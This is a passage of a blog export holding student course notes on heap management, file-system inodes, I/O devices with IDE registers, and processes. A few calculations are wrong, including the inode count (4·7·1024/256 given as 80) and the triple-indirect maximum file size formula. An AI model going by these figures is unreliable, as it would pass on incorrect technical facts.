value</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>Evaluation of Unions:</p>
<ol>
<li>Free unions are unsafe (do not allow type checking)</li>
<li><code>Java</code> and <code>C#</code> do not support because of the safety issues</li>
</ol>
</li>
</ul>
<h2 id="Heap-Management"><a href="#Heap-Management" class="headerlink" title="Heap Management"></a>Heap Management</h2><h3 id="Pointer"><a href="#Pointer" class="headerlink" title="Pointer"></a>Pointer</h3><ul>
<li><p>it stores the memory address of another variable or object in the program</p>
</li>
<li><p>it provides a power of <font color="3A75EA">indirect addressing</font> and a possibility of <font color="3A75EA">heap memory management</font></p>
</li>
<li><p>Lifetime</p>
<ul>
<li>a pointer is declared as a local variable within a function, then it is stored on the stack and destoried when the function is returned</li>
<li>a heap-dynamic variable is declared at runtime and remains valid until it is deallocated through <code>delete</code></li>
</ul>
</li>
<li><p>Pointer arithmetic</p>
<ul>
<li>the process of performing arithmetic operations on pointers  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span>* c = <span class="keyword">new</span> <span class="type">char</span>[<span class="number">5</span>];</span><br><span class="line">std::cout &lt;&lt; (<span class="type">void</span>*)(c) &lt;&lt; std::endl;       <span class="comment">// 0x1c39eb0</span></span><br><span class="line">std::cout &lt;&lt; (<span class="type">void</span>*)(c + <span class="number">1</span>) &lt;&lt; std::endl;   <span class="comment">// 0x1c39eb1 (+1)</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span>* p = <span class="keyword">new</span> <span class="type">int</span>[<span class="number">5</span>]&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;;</span><br><span class="line">std::cout &lt;&lt; (p) &lt;&lt; std::endl;      <span class="comment">// 0x1c39ed0</span></span><br><span class="line">std::cout &lt;&lt; (p + <span class="number">1</span>) &lt;&lt; std::endl;  <span class="comment">// 0x1c39ed4 (+4)</span></span><br><span class="line">std::cout &lt;&lt; *(p + <span class="number">1</span>) &lt;&lt; std::endl; <span class="comment">// 2</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>Problems</strong></p>
<ol>
<li><p>dangling pointers</p>
<ul>
<li>a pointer points to a heap-dynamic variable that has been deallocated <a href="https://donaldlamnl.github.io/myBlog/2022/09/18/2022/CSCI3150/2022-9-17-CSCI3150-SystemCall-Memory/">others</a>  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">char</span>* name;</span><br><span class="line">    <span class="built_in">Dog</span>()&#123; name = <span class="keyword">new</span> <span class="type">char</span>[<span class="number">5</span>]&#123;<span class="string">&quot;doge&quot;</span>&#125;; &#125;</span><br><span class="line">    <span class="comment">// solution: override the copy construction</span></span><br><span class="line">    ~<span class="built_in">Dog</span>()&#123; <span class="keyword">delete</span> [] name; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Dog* a = <span class="keyword">new</span> Dog;</span><br><span class="line">    Dog* b = <span class="keyword">new</span> <span class="built_in">Dog</span>(*a);   <span class="comment">// it is a shallow copy of a</span></span><br><span class="line">    <span class="keyword">delete</span> a;</span><br><span class="line">    std::cout &lt;&lt; b-&gt;name &lt;&lt; std::endl;  <span class="comment">// the name has already been deallocated</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>lost heap-dynamic variable</p>
<ul>
<li>an allocated heap-dynamic variable that is no longer accessible (it would lead to memory leak)  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span>* p = <span class="keyword">new</span> <span class="type">int</span>;</span><br><span class="line">p = <span class="keyword">new</span> <span class="type">int</span>;    <span class="comment">// create a new int and force p points to it</span></span><br><span class="line"><span class="keyword">delete</span> p;   <span class="comment">// cannot delete the new int that declared on the top</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
</li>
<li><p><strong>Solutions</strong> for dangling pointers</p>
<ol>
<li><p>Tombstone</p>
<ul>
<li>adding an extra heap cell (a pointer) to the heap-dynamic variable</li>
</ul>
 <img src="https://p.ipic.vip/1zz58f.png" width="500px" />

<ol>
<li>the actual pointer variable points only at the tombstone (a middleware among the variable and pointers)</li>
<li>when a heap-dynamic variable is deallocated, the tombstone remains but points to null</li>
</ol>
</li>
<li><p>Locks-and-keys</p>
<ul>
<li>the pointer values are represents as (key, address) and the heap-dynamic variables are represents as (key, values) <img src="https://p.ipic.vip/phxapn.png" width="500px" /></li>
</ul>
<ol>
<li>when a heap-dynamic variable is allocated and assigned to a pointer, a unique value is created and assigned to both pointer’s and variable’s key</li>
<li>when we use the pointer to access the corresponding variable, it would compare the key value first to check whether the access is legal or not</li>
<li>when the heap-dynamic variable is deallocated, the lock value is cleared to an illegal lock value to make sure it won’t be access</li>
</ol>
</li>
</ol>
</li>
</ul>
<h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><ul>
<li>reference type variable is similar to pointer but it only <font color="3A75EA">refers to an object</font> in memory instead of an address  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">a</span> <span class="operator">=</span> <span class="string">&quot;haha&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">b</span> <span class="operator">=</span> a;</span><br><span class="line"><span class="type">String</span> <span class="variable">c</span> <span class="operator">=</span> <span class="string">&quot;hehe&quot;</span>;</span><br><span class="line">b = c;  <span class="comment">// it would not change the value of a</span></span><br><span class="line">System.out.println(a);  <span class="comment">// haha</span></span><br></pre></td></tr></table></figure>
  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="type">int</span>&amp; b = a;</span><br><span class="line"><span class="type">int</span> c = <span class="number">2</span>;</span><br><span class="line">b = c;  <span class="comment">// it does change the value of a</span></span><br><span class="line">std::cout &lt;&lt; a &lt;&lt; std::endl;  <span class="comment">// 2</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="Implicit-Heap-Management"><a href="#Implicit-Heap-Management" class="headerlink" title="Implicit Heap Management"></a>Implicit Heap Management</h3><ol>
<li>Reference Counter<ul>
<li>maintain a reference counter in every cell, which stores the number of pointers currently pointing at the cell</li>
<li>when a pointer is disconnect from the cell, the counter is decreased by one and check for the zero value</li>
<li>if the counter value is 0 which means no pointers are pointing to it, then it would deallocate the memory</li>
</ul>
</li>
</ol>
<!-- 
<font color="3A75EA">Blue</font>
<font color="F54747">Red</font>
-->
]]></content>
      <categories>
        <category>CSCI3180</category>
      </categories>
      <tags>
        <tag>CSCI3180</tag>
      </tags>
  </entry>
  <entry>
    <title>CSCI3150 - Presistence (File System Implementation)</title>
    <url>/myBlog/2022/10/14/2022/CSCI3150/2022-10-14-CSCI3150-Presistence-FileSystemImplementation/</url>
    <content><![CDATA[<h2 id="Overall-Organization"><a href="#Overall-Organization" class="headerlink" title="Overall Organization"></a>Overall Organization</h2><ol>
<li><p><strong>On-Disk Organization</strong></p>
<ul>
<li>a series of blocks (e.g. size of each block is 4KB).</li>
<li>the blocks are addressed from 0 to N-1.</li>
</ul>
</li>
<li><p><strong>File System Organization</strong></p>
<ol>
<li><p><font color="#F54747"><strong>Metadata Region</strong></font>: tracks data and file system information</p>
<ol>
<li><p><font color="#F54747">Inode Table</font>:  the collection of all inodes</p>
<ul>
<li>There are 3 to 7 blocks for inode tables and each inode size is 256 bytes.</li>
<li>The file system can contain $ \frac{4 \cdot 7 \cdot 1024}{256} $ &#x3D; 80 inodes (i.e. maximum number of files).</li>
</ul>
</li>
<li><p><font color="#F54747">Bitmap</font>: to track whether inodes or data blocks are free or allocated</p>
<ul>
<li><font color="#3A75EA">data bitmap</font>: for data blocks in data region</li>
<li><font color="#3A75EA">inode bitmap</font>: for inode table</li>
</ul>
</li>
<li><p><font color="#F54747">Superblock</font>: tracks a file system</p>
<ul>
<li>It contains the <font color="#3A75EA">information</font> for the particular file system (e.g. the number of inodes, the begin location of inode table).</li>
</ul>
</li>
</ol>
</li>
<li><p><font color="#F54747"><strong>Data Region</strong></font>: stores user data and occupies most space</p>
</li>
</ol>
 <img src="https://p.ipic.vip/mvkrfc.png" width="500px" /></li>
</ol>
<h2 id="File-Organization"><a href="#File-Organization" class="headerlink" title="File Organization"></a>File Organization</h2><h3 id="Inode"><a href="#Inode" class="headerlink" title="Inode"></a>Inode</h3><ol>
<li><p>Inode</p>
<ul>
<li>Contains all the information about a file.</li>
<li>e.g. file type, size, protection information, time information, etc.</li>
</ul>
</li>
<li><p><strong><font color="#F54747">Direct Pointers</font></strong>: points to a data block explicitly</p>
<ul>
<li>Design of inode: <mark>How it refers to where data blocks are</mark>.</li>
<li>File system calculate where the data block that the inode refers to.</li>
<li>For example, given an inode number 32, calculate the offset into the inode region (32 $\times$ sizeof(inode)) &#x3D; 8192. Then, adding the start address of the inode table (12KB) + inode region (8KB) &#x3D; 20 KB and we can get the location of data block. <img src="https://p.ipic.vip/4m97x2.png" width="500px" /></li>
</ul>
</li>
<li><p>Storage</p>
 <img src="https://p.ipic.vip/d854yi.png" width="500px" />

<ul>
<li>The size of an inode is 60 bytes, and suppose each block number is 4 bytes, so we can store 15 blocks in total.<br> Suppose each data block is 4KB, the maximum file size is 15 $\times$ 4 &#x3D; 60KB.</li>
<li>Therefore, it is hard to support files of big sizes.</li>
</ul>
</li>
</ol>
<h3 id="Multi-Level-Index"><a href="#Multi-Level-Index" class="headerlink" title="Multi-Level Index"></a>Multi-Level Index</h3><ol>
<li><p><strong><font color="#F54747">Indirect Pointer</font></strong>: points to a block that contains (multiple) pointers to data blocks</p>
<ul>
<li>The maximum file size &#x3D; (12 + 1024) $\times$ 4KB $\approx$ 4MB.</li>
<li>Because each inode is 4 bytes and each block is 4KB, so we can hold 1024 inodes, then the file size is 1K $\times$ 4KB &#x3D; 4MB.</li>
</ul>
</li>
<li><p><strong><font color="#F54747">Double Indirect Pointer</font></strong>: points to pointers to indirect blocks</p>
<ul>
<li>The maximum file size &#x3D; (12 + 1024 $\times$ 1024) $\times$ 4KB $\approx$ 1 million 4KB blocks.</li>
</ul>
</li>
<li><p><strong><font color="#F54747">Triple Indirect Pointer</font></strong>: points to pointers to pointers to indirect block</p>
<ul>
<li>The maximum file size &#x3D; (12 + 1024 + 1024$^2$) $\times$ 4KB $\approx$ 4GB.</li>
</ul>
</li>
</ol>
<h2 id="Directory-Organization"><a href="#Directory-Organization" class="headerlink" title="Directory Organization"></a>Directory Organization</h2><ol>
<li><p>Directory</p>
<ul>
<li>Directory contains a list of (entry name, inode number) pairs.</li>
<li>Each directory has two extra file: <ul>
<li><code>.</code> : current directory</li>
<li><code>..</code> : parent directory</li>
</ul>
</li>
<li>For example: <code>dir</code> has three files : <code>foo</code>, <code>bar</code>, <code>foobar_is_a_pretty_longname</code>.</li>
</ul>
</li>
<li><p>Free Space Management</p>
<ul>
<li>File system track which inode and data block are free to use.</li>
<li>Two simple bitmaps are used to manage the free space.<ul>
<li>When file is newly created, it allocated the inode by searching the inode bitmap and update on-disk bitmap.</li>
<li>Pre-allocation policy is commonly used for allocate contiguous blocks.</li>
</ul>
</li>
</ul>
</li>
</ol>
<h2 id="Access-Paths"><a href="#Access-Paths" class="headerlink" title="Access Paths"></a>Access Paths</h2><h3 id="Reading-File-from-Disk"><a href="#Reading-File-from-Disk" class="headerlink" title="Reading File from Disk"></a>Reading File from Disk</h3><ul>
<li><p><code>open(&quot;/foo/bar&quot;, O_RDONLY)</code></p>
<ol>
<li>Traverse the pathname and thus locate the desired inode.</li>
<li>Begin at the root of the file system (<code>/</code>).</li>
<li>File system reads in the block that contains inode number 2 (the root inode number in most Unix file system).</li>
<li>Look inside of the content of root to find pointer to data blocks.</li>
<li>By reading in one or more directory data block, and find “foo” directory finally.</li>
<li>Tranverse recursively the path name until the desired inode (“bar”).</li>
<li>Check the finale permissions (權限), allocate a file descriptor for this process and return the file descriptor.</li>
</ol>
</li>
<li><p><code>read()</code> and <code>close()</code></p>
<ol>
<li>Read in the first block of the file, consulting the inode to find the location of that block.<ul>
<li><font color="F54747">Update the inode</font> with a new last accessed time.</li>
<li><font color="F54747">Update in-memory open file table</font> for file descriptor (i.e. the file offset).</li>
</ul>
</li>
<li>When the file is closed, the file descriptor should be disallocated.<ul>
<li><font color="F54747">NO disk I&#x2F;Os take place</font>.</li>
</ul>
</li>
</ol>
</li>
<li><p>Timeline for reading file from disk:</p>
  <img src="https://p.ipic.vip/5sdw6u.png" width="700px" /></li>
</ul>
<h3 id="Writing-to-Disk"><a href="#Writing-to-Disk" class="headerlink" title="Writing to Disk"></a>Writing to Disk</h3><ul>
<li><p><code>write()</code>: update the file with new contents</p>
<ul>
<li>Need to update <font color="3A75EA">data block</font> and <font color="3A75EA">data bitmap</font>.</li>
<li>Generates 5 I&#x2F;Os:<ol>
<li><font color="F54747">read</font> the <font color="3A75EA"> data bitmap</font></li>
<li><font color="F54747">write</font> the <font color="3A75EA"> data bitmap</font> (to reflect its new state to disk)</li>
<li><font color="F54747">read</font> the <font color="3A75EA">inode</font></li>
<li><font color="F54747">write</font> the <font color="3A75EA">inode</font></li>
<li><font color="F54747">write</font> the <font color="3A75EA">actual block</font> itself</li>
</ol>
</li>
<li>Need to allocate space or directory for creating file, it causes high I&#x2F;O traffic.</li>
</ul>
</li>
<li><p>Timeline for writing to disk:</p>
  <img src="https://p.ipic.vip/3cxwd2.png" width="700px" /></li>
</ul>
<h2 id="Caching-amp-Buffering"><a href="#Caching-amp-Buffering" class="headerlink" title="Caching &amp; Buffering"></a>Caching &amp; Buffering</h2><ol>
<li><p>Problems:</p>
<ul>
<li>Reading and writing files are expensive because it incurs many I&#x2F;Os.<ul>
<li>For example, long pathname (<code>/dir1/dir2/.../dir100/file.txt</code>)</li>
<li>It performs hundreds of reads in order to open the file (one to read the inode of the directory and at least one to read its data).</li>
</ul>
</li>
</ul>
</li>
<li><p>Solutions:</p>
<ol>
<li><p>Read &amp; Cache</p>
<ul>
<li>To reduce the I&#x2F;O traffic, file system uses system memory (DRAM) to cache.<ul>
<li>Early, file system uses fixed-size cache to hold the popular blocks, but it is wasting memory.</li>
<li>Now, model system uses <font color="3A75EA">dynamic partitioning approach</font> and <font color="3A75EA">unified page cache</font>.</li>
</ul>
</li>
<li>Thus, read I&#x2F;O can be avoided by the cache.</li>
</ul>
</li>
<li><p>Write &amp; Buffer</p>
<ul>
<li>Since write traffic has to go to the disk for persistent, cache does not reduce write I&#x2F;Os.</li>
<li>File system uses write buffering for writing performance benefits.<ul>
<li>It can delay writes such that the file system batch some updates into a smaller set of I&#x2F;Os.</li>
<li>By buffering a number of writes in memory, the file system can schedule the subsequent I&#x2F;Os.</li>
</ul>
</li>
<li>Some application force flush data to the disk by calling <code>fsync()</code> or direct I&#x2F;O.</li>
</ul>
</li>
</ol>
</li>
</ol>
]]></content>
      <categories>
        <category>CSCI3150</category>
      </categories>
  </entry>
  <entry>
    <title>CSCI3150 - Presistence (I/O Devices)</title>
    <url>/myBlog/2022/10/26/2022/CSCI3150/2022-10-26-CSCI3150-Presistence-IODevice/</url>
    <content><![CDATA[<h2 id="I-x2F-O-System-Architecture"><a href="#I-x2F-O-System-Architecture" class="headerlink" title="I&#x2F;O System Architecture"></a>I&#x2F;O System Architecture</h2><img src="https://p.ipic.vip/7li9ig.png" width="600px"/>

<ol>
<li><p>Buses</p>
<ul>
<li>Data paths that used to communicate information with the CPU(s), RAM and I&#x2F;O Devices.</li>
<li><font color="3A75EA">CPU</font> is attached to the <font color="3A75EA">main memory</font> of the system via a <font color="F54747">memory bus</font>.</li>
<li><font color="3A75EA">Some devices</font> are connected to the <font color="3A75EA">system</font> via a <font color="F54747">general I&#x2F;O bus</font>.</li>
</ul>
</li>
<li><p>I&#x2F;O Bus</p>
<ul>
<li>data path that connects CPU to I&#x2F;O Devices.</li>
<li>I&#x2F;O Device is connected to I&#x2F;O bus by three hardware components:<ol>
<li>I&#x2F;O ports</li>
<li>interfaces</li>
<li>device controllers</li>
</ol>
</li>
</ul>
</li>
</ol>
<h2 id="Canonical-Device"><a href="#Canonical-Device" class="headerlink" title="Canonical Device"></a>Canonical Device</h2><img src="https://p.ipic.vip/ofaiph.png" width="600px"/>

<h3 id="Hardware-Interface"><a href="#Hardware-Interface" class="headerlink" title="Hardware Interface"></a>Hardware Interface</h3><ul>
<li><p>Allows the system software to control its operation</p>
</li>
<li><p>Operating system can control the device behavior by reading and writing the following registers:</p>
<ol>
<li><p><font color="F54747">status register</font></p>
<ul>
<li>see the current status of the device</li>
</ul>
</li>
<li><p><font color="F54747">command register</font></p>
<ul>
<li>tell the device to perform a certain task</li>
</ul>
</li>
<li><p><font color="F54747">data register</font></p>
<ul>
<li>pass data to the device or get data from the device</li>
</ul>
</li>
</ol>
</li>
<li><p>Tipical interaction example:</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> ( STATUS == BUSY) ; <span class="comment">// wait until device is not busy</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// write data to data register</span></span><br><span class="line"><span class="comment">// write command to command register</span></span><br><span class="line">    <span class="comment">// starts the device and executes the command</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> ( STATUS == BUSY ) ; <span class="comment">// wait until device is done with your request</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="Internals"><a href="#Internals" class="headerlink" title="Internals"></a>Internals</h3><ul>
<li>Implement the specific operations</li>
</ul>
<h2 id="General-Mechanisms"><a href="#General-Mechanisms" class="headerlink" title="General Mechanisms"></a>General Mechanisms</h2><h3 id="Polling"><a href="#Polling" class="headerlink" title="Polling"></a>Polling</h3><ul>
<li><p>Operating system waits until the device is ready by repeatedly reading the status register.</p>
</li>
<li><p>Advantages:</p>
<ul>
<li>simple and it works.</li>
</ul>
</li>
<li><p>Disadvantages:</p>
<ul>
<li>it wastes CPU time for just waiting for the device,<br>  so switching to another process during the waiting time may be a better utilize of CPU.</li>
</ul>
</li>
</ul>
<img src="https://p.ipic.vip/9dtgq2.png" width="600px"/>



<h3 id="Interrupt"><a href="#Interrupt" class="headerlink" title="Interrupt"></a>Interrupt</h3><ul>
<li><p>Put the I&#x2F;O request process to <font color="3A75EA">sleep</font> and context switch to another process.</p>
</li>
<li><p>When the device is finished, <font color="3A75EA">wake</font> the process (waiting for the device finished) by interrupt.</p>
</li>
<li><p>Advantages:</p>
<ul>
<li>allow CPU and the disk are properly utilized.</li>
</ul>
</li>
<li><p>Noted: interrupt is not always the best</p>
<ul>
<li>Because context switch is <font color="3A75EA">expensive</font>, if the device performs very fast, then interrupt will slow down the system.<ul>
<li>If the device is fast, then polling is the best</li>
<li>Otherwise, interrupt is the best</li>
</ul>
</li>
</ul>
</li>
</ul>
<img src="https://p.ipic.vip/wff0s5.png" width="600px"/>



<h3 id="Direct-Memory-Access"><a href="#Direct-Memory-Access" class="headerlink" title="Direct Memory Access"></a>Direct Memory Access</h3><ol>
<li><p>Problems:</p>
<ul>
<li>CPU wastes a lot of time to copy a large chunk of data from memory to the device. <img src="https://p.ipic.vip/y3hdm9.png" width="600px"/></li>
</ul>
</li>
<li><p>Solution: Direct Memory Access DMA</p>
<ul>
<li>Copy data in memory by knowing the <font color="3A75EA">location of data in memory</font> and the <font color="3A75EA">number of data block need to copy</font>.</li>
<li>When the copying finished, DMA raises an interrupt on the disk. <img src="https://p.ipic.vip/hj1xbw.png" width="600px"/></li>
</ul>
</li>
</ol>
<h2 id="Device-Interacftions"><a href="#Device-Interacftions" class="headerlink" title="Device Interacftions"></a>Device Interacftions</h2><ul>
<li>The communications between operating system and device<ol>
<li><p><font color="F54747">I&#x2F;O Instructions</font></p>
<ul>
<li>a way for the OS to send data to specific device registers</li>
<li>e.g., <code>in</code> and <code>out</code> instructions on x86.</li>
</ul>
</li>
<li><p><font color="F54747">Memory-mapped I&#x2F;O</font></p>
<ul>
<li>a specific area inside the memory for the I&#x2F;O device (those device registers are available as memory locations).</li>
<li>i.e., the OS <code>load</code> (read) and <code>store</code> (write) to the <font color="3A75EA">device</font>, instead of <font color="3A75EA">the main memory</font>.</li>
</ul>
</li>
</ol>
</li>
</ul>
<h3 id="File-System-Abstraction"><a href="#File-System-Abstraction" class="headerlink" title="File System Abstraction"></a>File System Abstraction</h3><ul>
<li><p>The abstraction excapsulate the specifics of device interaction which lets the OS can interact with different specific interfaces.</p>
<img src="https://p.ipic.vip/c4raa3.png" width="600px"/>
</li>
<li><p>Problems:</p>
<ul>
<li>If there is a device having many special undefined functions, then these functions will go unused in the generic interface layer</li>
<li>Over 70% of OS code is found in device drives<ul>
<li>it takes lots of times to drive the devices</li>
<li>those devices are the primary contributors to kernel crashes</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="Simple-IDE-Disk-Driver"><a href="#Simple-IDE-Disk-Driver" class="headerlink" title="Simple IDE Disk Driver"></a>Simple IDE Disk Driver</h2><h3 id="Registers"><a href="#Registers" class="headerlink" title="Registers"></a>Registers</h3><ol>
<li><p>Control Register</p>
<ul>
<li>Address <code>0x3F6 = 0X80 (0000 1RE0)</code>:<ul>
<li><code>R</code> &#x3D; reset</li>
<li><code>E = 0</code> means “enable interrupt”</li>
</ul>
</li>
</ul>
</li>
<li><p>Command Block Registers</p>
<ul>
<li>Address <code>0x1F0</code> &#x3D; Data Port</li>
<li>Address <code>0x1F1</code> &#x3D; Error</li>
<li>Address <code>0x1F2</code> &#x3D; Sector Count</li>
<li>Address <code>0x1F3</code> &#x3D; LBA low byte</li>
<li>Address <code>0x1F4</code> &#x3D; LBA mid byte</li>
<li>Address <code>0x1F5</code> &#x3D; LBA hi byte</li>
<li>Address <code>0x1F6 = 1B1D TOP4LBA</code> : B &#x3D; LBA, D &#x3D; drive</li>
<li>Address <code>0x1F7</code> &#x3D; Command &#x2F; Status</li>
</ul>
</li>
<li><p>Status Register (Address <code>0x1F7</code>):</p>
<ul>
<li><code>7</code> : <code>BUSY</code></li>
<li><code>6</code> : <code>READY</code></li>
<li><code>5</code> : <code>FAULT</code></li>
<li><code>4</code> : <code>SEEK</code></li>
<li><code>3</code> : <code>DRQ</code></li>
<li><code>2</code> : <code>CORR</code></li>
<li><code>1</code> : <code>IDDEX</code></li>
<li><code>0</code> : <code>ERROR</code></li>
</ul>
</li>
<li><p>Error Register (Address <code>0x1F1</code>)</p>
<ul>
<li><code>7</code> : <code>BBK</code> (Bad Block)</li>
<li><code>6</code> : <code>UNC</code> (Uncorrectable data error)</li>
<li><code>5</code> : <code>MC</code> (Media Changed)</li>
<li><code>4</code> : <code>IDNF</code> (ID mark Not Found)</li>
<li><code>3</code> : <code>MCR</code> (Media Change Requested)</li>
<li><code>2</code> : <code>ABRT</code> (Command aborted)</li>
<li><code>1</code> : <code>T0NF</code> (Track 0 Not Found)</li>
<li><code>0</code> : <code>AMNF</code> (Address Mark Not Found)</li>
</ul>
</li>
</ol>
<h3 id="Operations"><a href="#Operations" class="headerlink" title="Operations"></a>Operations</h3><ol>
<li><p>Wait for drive to be ready</p>
<ul>
<li>Read Status Register until drive is not busy and <code>READY</code>.</li>
</ul>
</li>
<li><p>Write parameters to command registers</p>
<ul>
<li>Wite the sector count, logical block address (LBA) of the sectors to be accessed, and drive number (<code>master=0x00</code> or <code>slave=0x10</code>, as IDE permits just two drives) to command registers (<code>0x1F2</code> - <code>0x1F6</code>).</li>
</ul>
</li>
<li><p>Start the I&#x2F;O</p>
<ul>
<li>Issuing read&#x2F; write to command register.</li>
<li>Write <code>READ—WRITE</code> command to command register (<code>0x1F7</code>).</li>
</ul>
</li>
<li><p>Data transfer (for writes)</p>
<ul>
<li>Wait until the drive status is <code>READY</code> and <code>DRQ</code>, write data to data port.</li>
</ul>
</li>
<li><p>Handle interrupts</p>
<ul>
<li>In the simplest case, handle an interrupt for each sector transferred.</li>
<li>More complex approaches allow batching.</li>
</ul>
</li>
<li><p>Handle errors</p>
<ul>
<li>After each operation, read the status register. If the <code>ERROR</code> bit is on, read the error register for details.</li>
</ul>
</li>
</ol>
]]></content>
      <categories>
        <category>CSCI3150</category>
      </categories>
  </entry>
  <entry>
    <title>CSCI3150 - Virtualizing CPU (Process)</title>
    <url>/myBlog/2022/10/27/2022/CSCI3150/2022-10-27-CSCI3150-Virtualizing-CPU-Process/</url>
    <content><![CDATA[<h2 id="Process"><a href="#Process" class="headerlink" title="Process"></a>Process</h2><ul>
<li>Process is a running program, which includes:<ol>
<li>Memory (address space)<ul>
<li>Instructions</li>
<li>Data sections</li>
</ul>
</li>
<li>Registers<ul>
<li>Program counter</li>
<li>Stack pointer</li>
</ul>
</li>
</ol>
</li>
</ul>
<h3 id="Process-API"><a href="#Process-API" class="headerlink" title="Process API"></a>Process API</h3><ol>
<li><p><code>Create</code></p>
<ul>
<li>create a new process to run a program</li>
</ul>
</li>
<li><p><code>Destory</code></p>
<ul>
<li>halt a runaway process</li>
</ul>
</li>
<li><p><code>Wait</code></p>
<ul>
<li>wait for a process to stop running</li>
</ul>
</li>
<li><p><code>Miscellaneous Control</code></p>
<ul>
<li>some kind of method to suspend a process and then resume it (暫停然後恢復)</li>
</ul>
</li>
<li><p><code>Status</code></p>
<ul>
<li>get some status information about a process</li>
</ul>
</li>
</ol>
<h3 id="Process-Creation"><a href="#Process-Creation" class="headerlink" title="Process Creation"></a>Process Creation</h3><ol>
<li><p>Load a program code into <font color="F54747">memory</font>, then build up an <font color="F54747">address space</font> for the process.</p>
<ul>
<li>The OS performs the loading process lazily, it loads the pieces of code or data <font color="3A75EA">only when they are needed</font> during the program execution.</li>
</ul>
</li>
<li><p>Allocate the program’s run-time <font color="F54747">process stack</font> (store at the bottom of the address space)</p>
<ul>
<li><p>Used for <font color="3A75EA">local variables</font>, <font color="3A75EA">function parameters</font> and <font color="3A75EA">return address</font>.</p>
</li>
<li><p>Initialize the stack with arguments <code>argc</code> and the <code>argv</code> array of <code>main()</code> function.</p>
</li>
</ul>
</li>
<li><p>Create the program’s <font color="F54747">heap</font> (store at the position that after the coding)</p>
<ul>
<li>Used for <font color="3A75EA">requesting dynamically allocated data</font>.</li>
<li>Program requests such space by calling <code>malloc()</code> and free it by calling <code>free()</code>.</li>
</ul>
</li>
<li><p>Do the initialization tasks</p>
<ul>
<li>Input &#x2F; Output setup<ul>
<li>each process has three open file descriptors in default</li>
<li>standard input, output an error</li>
</ul>
</li>
</ul>
</li>
<li><p>Start the program running at the entry point (<code>main()</code>)</p>
</li>
</ol>
<img src="https://p.ipic.vip/h01f63.png" width="500px">



<h3 id="Process-Status"><a href="#Process-Status" class="headerlink" title="Process Status"></a>Process Status</h3><ol>
<li><p>Running</p>
<ul>
<li>A process is running on a processor.</li>
</ul>
</li>
<li><p>Ready</p>
<ul>
<li>A process is ready to run but for some reason the OS has chosen <font color="3A75EA">not to run it</font> at the moment.</li>
</ul>
</li>
<li><p>Blocked</p>
<ul>
<li>A process has performed some kind of operation.</li>
<li>When a process initiates an I&#x2F;O request to a disk, it becomes <font color="3A75EA">blocked</font> and thus some other process can use the processor.<img src="https://p.ipic.vip/n3v5i6.png" width="400px"></li>
</ul>
</li>
</ol>
<h3 id="Data-Structures"><a href="#Data-Structures" class="headerlink" title="Data Structures"></a>Data Structures</h3><ul>
<li>In the OS system, the key data structure<ol>
<li><p><strong>Process List</strong></p>
<ul>
<li>Current running process</li>
<li>Ready processes</li>
<li>Blocked processes</li>
</ul>
</li>
<li><p><strong>Register Context</strong></p>
<ul>
<li>the registers we need to run the process.</li>
</ul>
</li>
<li><p><strong>Process Control Block</strong></p>
<ul>
<li>For each process, there is an in-memory data structure that contains information about that process.</li>
</ul>
</li>
</ol>
</li>
</ul>
<h2 id="Execution-Mechanism"><a href="#Execution-Mechanism" class="headerlink" title="Execution Mechanism"></a>Execution Mechanism</h2><ul>
<li>The OS need to share the physical CPU by <font color="F54747">time sharing</font>,<br><font color="3A75EA">i.e., How we implement time sharing among multiple processes</font>.<ol>
<li><strong>Performance</strong>: How can we implement virtualization <font color="3A75EA">without add excessive overhead</font> to the system?</li>
<li><strong>Control</strong>: How can we run processes efficiently while <font color="3A75EA">retaining control</font> over the CPU?</li>
</ol>
</li>
</ul>
<h3 id="Direct-Execution"><a href="#Direct-Execution" class="headerlink" title="Direct Execution"></a>Direct Execution</h3><h4 id="Execution-Procedure"><a href="#Execution-Procedure" class="headerlink" title="Execution Procedure"></a>Execution Procedure</h4><img src="https://p.ipic.vip/so5ak6.png" width="500px">
<!-- | OS | Program |
| :--- | :--- |
| 1. Create entry for the process list | |
| 2. Allocate memory for the program | |
| 3. Load program into the memory | |
| 4. Set up stack with `argc` / `argv` | |
| 5. Clear registers | |
| 6. Execute call `main()` | |
| | 7. Run `main()` |
| | 8. Execute `return` from `main()` |
| 9. Free memory of process | |
| 10. Remove from process list | | -->


<h4 id="Problems"><a href="#Problems" class="headerlink" title="Problems"></a>Problems</h4><ul>
<li><p><strong>Problem</strong>: <font color="F54747"><strong>Restricted Operation</strong></font></p>
<ul>
<li>if a process wishes to perform some kind of restricted operation (受限的操作), such as,<ul>
<li>issung an I&#x2F;O request to a disk</li>
<li>gaining access to more system resources like CPU or memory</li>
</ul>
</li>
<li>The running program should be <font color="F54747">limited</font>, otherwise the OS would not be <font color="F54747">in control of anything</font> (it just becomes a library).</li>
<li>There should be something to isolate the applications and OS system, not allow the process touches the other processes’ address space.</li>
</ul>
</li>
